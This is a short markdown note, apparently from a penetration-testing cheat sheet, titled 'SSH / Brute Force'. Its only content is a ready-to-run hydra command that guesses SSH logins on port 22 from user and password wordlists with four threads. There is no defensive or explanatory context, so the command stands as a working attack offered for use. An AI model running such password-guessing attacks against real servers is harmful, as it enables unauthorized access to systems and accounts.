# SSH

## Brute Force

```
hydra IP_ADDRESS ssh -s 22 -P passwords.txt -L users.txt -e nsr -t 4
```
